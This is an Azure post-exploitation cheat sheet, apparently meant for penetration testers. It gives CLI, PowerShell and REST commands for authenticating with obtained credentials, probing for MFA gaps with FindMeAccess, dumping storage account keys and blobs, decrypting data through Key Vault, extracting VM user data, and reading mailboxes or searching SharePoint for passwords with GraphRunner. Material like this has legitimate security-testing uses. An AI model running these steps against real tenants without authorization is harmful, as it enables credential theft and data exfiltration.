# Valid Credentials

### 1) Authenticate

User

    az login -u USER - p PASSWORD --tenant TENANT_ID

Token-based auth

    $token = "TOKEN"
    Connect-AzAccount -AccessToken $token -AccountID "USER.NAME"

Service Principal

    az login --service-principal -u CLIENT_ID -p SECRET --tenant TENANT_ID

### 2) List resources our account has access to (either read or write)

Azure CLI

    az resource list

Azure PowerShell

    Get-AzResource
    
## MFA Enablement gap audit

### 1) Download and install tool FindMeAccess

    git clone https://github.com/absolomb/FindMeAccess
    pip install -r requirements.txt

### 2) Get session token of target user

ClientIDs Link: https://learn.microsoft.com/en-us/power-platform/admin/apps-to-allow

Use client ID of Microsoft Azure PowerShell to authenticate to the Azure Resource Manager (ARM) API endpoint (example)

    python3 findmeaccess.py token -u USER.NAME@megacorp.com -p PASSWORD -r "https://management.azure.com" -c "d3590ed6-52b3-4102-aeff-aad2292ab01c"

Use PS5 User-Agent (example)

    python3 findmeaccess.py token -u USER.NAME@megacorp.com -p PASSWORD -r "https://management.azure.com" -c "d3590ed6-52b3-4102-aeff-aad2292ab01c" --user_agent "Mozilla/5.0 (PlayStation 5 3.03/SmartTV) AppleWebKit/605.1.15 (KHTML, like Gecko)"

## Storage Accounts

Request Storage API endpoint token

    curl -s -H "X-Identity-Header: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2019-08-01&resource=https://storage.azure.com&client_id=$ENTRA_CLIENT_ID"'

Store it (YOU CAN USE THIS VIA DIRECT API CALLS TO REQUEST FOR ANY RESOURCES RELATED TO STORAGE ACCOUNTS)

    $mistoragetoken = "STORAGE_API_TOKEN"

### 1) List storage account keys

    az storage account keys list -g RESOURCE_GROUP -n NAME

Entra-based (RBAC Auth)

    az account set --subscription SUBSCRIPTION_ID
    KEY=$(az storage account keys list -g RESOURCE_GROUP -n NAME --query '[0].value' -o tsv)

Azure PowerShell

    $storageAccount = Get-AzStorageAccount -ResourceGroupName "RESOURCE_GROUP_NAME" -Name "STORGAE_ACCOUNT_NAME"
    $ctx = $storageAccount.Context
    Get-AzStorageContainer -Context $ctx | Format-Table

Direct API calls

    $storageAccountName = "STORAGE_ACCOUNT_NAME"
    $apiVersion = "2021-04-10"
    $headers = @{
        "Authorization" = "Bearer $mitoken"
        "x-ms-version"  = $apiVersion
    }
    
    $url = "https://$storageAccountName.blob.core.windows.net/?comp=list"
    
    $response = Invoke-RestMethod -Method Get -Uri $url -Headers $headers
    $response

Direct API call (with curl)

    curl -sS -X POST \
      -H "Authorization: Bearer $token" \
      -H "Content-Type: application/json" \
      -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/SUBSCRIPTION_ID/resourceGroups/RESOURCE_GROUP_NAME/providers/Microsoft.Storage/storageAccounts/STORAGE_ACCOUNT_NAME/listKeys?api-version=2023-01-01" | jq

### 2) List containers

Azure CLI

    az storage container list --account-name STORAGE_ACCOUNT_NAME --auth-mode login -o table

Azure CLI with storage account keys

    az storage list --account-name STORAGE_ACOUNT_NAME --account-key "ACCOUNT_KEY" -o table

Direct API Call

    $storageAccountName = "STORAGE_ACCOUNT_NAME"
    $apiVersion = "2021-04-10"
    $headers = @{
        "Authorization" = "Bearer $mistoragetoken"
        "x-ms-version"  = $apiVersion
    }
    
    $url = "https://$storageAccountName.blob.core.windows.net/?comp=list"
    
    $response = Invoke-RestMethod -Method Get -Uri $url -Headers $headers
    $response | xmllint --format -

### 3) List blobs in the container

Azure CLI

    az storage blob list --account-name STORAGE_ACCOUNT_NAME --container-name CONTAINER_NAME --auth-mode login -o table

Azure CLI detailed query enumeration

    az storage blob list --account-name STORAGE_ACOUNT_NAME --account-key ACCOUNT_KEY --container-name CONTAINER_NAME --query "[].{Name:name, Size:properties.contentLength, LastModified:properties.lastModified}" -o table

Direct API Call

    $storageAccountName = "STORAGE_ACCOUNT_NAME"
    $containerName = "CONTAINER_NAME"
    $apiVersion = "2021-04-10"
    $headers = @{
        "Authorization" = "Bearer $mistoragetoken"
        "x-ms-version"  = $apiVersion
    }
    
    $baseUri = "https://$storageAccountName.blob.core.windows.net/$containerName"
    $query = "?restype=container&comp=list"
    $url = $baseUri + $query
    
    $response = Invoke-RestMethod -Method Get -Uri $url -Headers $headers
    $response | xmllint --format -

### 4) Download container contents

Azure CLI

    az storage blob download --account-name STORAGE_ACCOUNT_NAME --container-name CONTAINER_NAME --name BLOB_NAME --file BLOB_NAME --auth-mode login

Azure CLI Batch download

    az storage blob download-batch --account-name STORAGE_ACCOUNT_NAME --account-key ACCOUNT_KEY -s CONTAINER_NAME -d ./DESTINATION_FOLDER

Direct API Call

    $blobName = "BLOB_NAME"
    $storageAccountName = "STORAGE_ACCOUNT_NAME"
    $containerName = "CONTAINER_NAME"
    $apiVersion = "2021-04-10"
    $headers = @{
        "Authorization" = "Bearer $mistoragetoken"
        "x-ms-version"  = $apiVersion
    }
    
    $blobUrl = "https://$storageAccountName.blob.core.windows.net/$containerName/$blobName"
    
    $destinationPath = "~/$blobName"
    
    Invoke-RestMethod -Method Get -Uri $blobUrl -Headers $headers -OutFile $destinationPath

## Azure Key Vault

### 1) List vaults

    az keyvault list

### 2) List secrets

    az keyvault secret list --vault-name VAULT_NAME -o table

### 3) List keys

    az keyvault key list --vault-name VAULT_NAME -o table

### 3) Perform decryption

Encode our downloaded content to base64

    base64 < BLOB_NAME | tr -d '\n' > BASE64_ENCODED_BLOB

Decrypt by calling the vault directly using the stored key. (Azure handles the decryption and returns plaintext)

    az keyvault key decrypt --vault-name VAULT_NAME --name KEY_NAME --algorithm RSA-OAEP --value BASE64_ENCODED_BLOB --query result -o tsv | base64 -d > BLOB_PLAINTEXT

### 4) Query if the keyvault can be used for template deployment

    az keyvault show --name VAULT_NAME --query "properties.enabledForTemplateDeployment"

## Resources

### 1) List Resources

Azure CLI

    az resource list

Azure PowerShell

    Get-AzResource

Direct API call 

    curl -s "https://management.azure.com/subscriptions/SUBSCRIPTION_ID/resourceGroups/RESOURCE_GROUP_NAME/resources?api-version=2021-04-01" -H "Authorization: Bearer $token" | jq

### 2) Get URL of a specific resource

    (Get-AzWebApp -ResourceGroupName "RESOURCE_GROUP_NAME" -Name "APP_NAME").DefaultHostName

## Azure Static Web App

### 1) Enumerate an Azure Static Web App

    az staticwebapp show --name STATIC_WEB_APP_NAME --resource-group RESOURCE_GROUP_NAME

### 2) Enumerate the Azure Web Static Web App settings

    az staticwebapp appsettings list --name STATIC_WEB_APP_NAME --resource-group RESOURCE_GROUP_NAME

## Azure VMs

### 1) Enumerate a specific Azure VM

    az vm show --resource-group RESOURCE_GROUP --name VM_NAME

### 2) Get the User Data values from the VM

Azure CLI

    az vm show --resource-group RESOURCE_GROUP_NAME --name VM_NAME -u --query "userData" --output tsv | base64 -d

Azure PowerShell

    (Get-AzVM -ResourceGroupName "RESOURCE_NAME" -Name "VM_NAME" -UserData).UserData | base64 -d

Direct API call

#### Print our ARM access token

    az account get-access-token

#### Set access token as variable

    $token="ACCESS_TOKEN"

#### Get User Data

    Invoke-RestMethod -Method GET -Uri "https://management.azure.com/subscriptions/SUBSCRIPTION_ID/resourceGroups/RESOURCE_GROUP_NAME/providers/Microsoft.Compute/virtualMachines/VM_NAME?api-version=2021-07-01&`$expand=userData" -Headers @{Authorization = "Bearer $token"}

#### Decode content

    echo BASE64_USER_DATA | base64 -d

## Azure Network

### 1) Get the public IP address of a VM

    az network public-ip show --resource-group RESOURCE_GROUP_NAME --name VM_NAME --query "ipAddress" --output tsv

## Azure RBAC

### 1) List permissions of our account on resources

Azure PowerShell

    Get-AzRoleAssignment

### 2) Check Azure RBAC roles assigned on an identity

    az role assignment list --assignee CLIENT_ID --all -o json | grep roleDefinitionName -B 1

### 3) Check details for a role

Azure CLI

    az role definition show --id "/subscriptions/SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleDefinitions/ROLE_DEFINITION_ID" --query "permissions"

Azure PowerShell

    Get-AzRoleDefinition -Id ROLE_DEFINITION_ID | select -ExpandProperty Actions

## Entra ID

### 1) Query an Enterprise Application notes field (example) by quering the service principal 

    az ad sp show --id CLIENT_ID --query "notes"

## Azure Resource Manager (ARM)

### 1) Deploy resources by reading a template file (parameters can vary according to use case)

    az deployment group create --resource-group RESOURCE_GROUP_NAME --template-file template.json --parameters storageAccountName=STORAGE_ACCOUNT_NAME location=REGION

Template.json example

    {
      "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
      "contentVersion": "1.0.0.0",
      "parameters": {
        "storageAccountName": {
          "type": "string"
        },
        "location": {
          "type": "string"
        }
      },
      "resources": [
        {
          "type": "Microsoft.Storage/storageAccounts",
          "apiVersion": "2022-09-01",
          "name": "[parameters('storageAccountName')]",
          "location": "[parameters('location')]",
          "kind": "StorageV2",
          "sku": {
            "name": "Standard_LRS"
          }
        }
      ]
    }

## Microsoft Graph API (Microsoft 365)

Tool: 

1) GraphRunner https://github.com/dafthack/GraphRunner

Initiate module

    Import-Module .\GraphRunner.ps1

### 1) Get a Microsoft Graph Session

    Get-GraphTokens

Print access token

    $tokens.access_token

### 2) Check user's inbox

    Get-Inbox -Tokens $tokens -userid USER.NAME@megacorp.com

### 3) Check SharePoint URLs

    Get-SharePointSiteURLs -Tokens

### 4) Search and download files that contain a specific term

    Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "password"

## Azure Logic Apps

### 1) Enumerate a specific Azure Logic App

    az logicapp show --resource-group RESOURCE_GROUP_NAME --name LOGIC_APP_NAME

### 2) Access the workflow of a logic app

    az logic workflow list
